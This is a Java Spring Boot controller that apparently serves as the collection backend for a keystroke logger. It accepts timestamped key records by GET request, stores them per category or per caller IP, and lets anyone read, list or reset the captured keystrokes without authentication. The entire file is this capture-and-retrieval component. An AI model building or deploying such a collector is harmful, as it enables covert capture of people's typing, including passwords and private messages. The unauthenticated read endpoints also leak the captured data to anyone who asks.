package com.hellokoding.springboot.view;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.json.GsonJsonParser;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.ConcurrentHashMap;

@RestController
public class LogController {

    private static Map<String, Map<Number, String>> keyStrokesStringMap = new ConcurrentHashMap<>();
    private static Map<String, Map<Number, String>> keyStrokesJsonMap = new ConcurrentHashMap<>();

    @Autowired
    HttpServletRequest request;

    @GetMapping({"log/{category}/{log}"})
    public void collect(@PathVariable String category, @PathVariable String log) {
        if ("me".equalsIgnoreCase(category)) {
            category = request.getRemoteAddr();
        }
        double ts = 0;
        {
            Map<Number, String> buffer = keyStrokesStringMap.get(category);
            if (buffer == null) {
                buffer = new TreeMap<>();
                keyStrokesStringMap.put(category, buffer);
            }
            for (Object o : new GsonJsonParser().parseList(log)) {
                Map v = (Map) o;
                ts = Double.parseDouble(v.get("t").toString());
                buffer.put(ts, (v.get("k").toString()));
            }
        }
        {
            Map<Number, String> buffer = keyStrokesJsonMap.get(category);
            if (buffer == null) {
                buffer = new TreeMap<>();
                keyStrokesJsonMap.put(category, buffer);
            }
            buffer.put(ts,log);
        }
    }

    @GetMapping(value = {"/log/{category}"}, produces = {"text/plain"})
    public ResponseEntity<String> readLogs(@PathVariable String category, @RequestParam(required = false, defaultValue = "false") String json) {
        StringBuilder buffer = new StringBuilder();
        if ("me".equalsIgnoreCase(category)) {
            category = request.getRemoteAddr();
        }
        Map keyStrokes = Boolean.parseBoolean(json) ? keyStrokesJsonMap.get(category) : keyStrokesStringMap.get(category);
        if (keyStrokes != null) {
            keyStrokes.values().forEach(v -> buffer.append(v));
        }
        return ResponseEntity.ok(buffer.toString());
    }

    @GetMapping(value = {"/log/categories"}, produces = {"text/plain"})
    public ResponseEntity<String> readCategories() {
        StringBuffer stringBuffer = new StringBuffer();
        keyStrokesStringMap.keySet().forEach(cat -> stringBuffer.append(cat).append("\n"));
        return ResponseEntity.ok(stringBuffer.toString());
    }

    @GetMapping(value = {"/log/categories/reset"}, produces = {"text/plain"})
    public ResponseEntity<String> resetCategories() {
        keyStrokesJsonMap = new ConcurrentHashMap<>();
        keyStrokesStringMap = new ConcurrentHashMap<>();
        return ResponseEntity.ok("reseted");
    }
}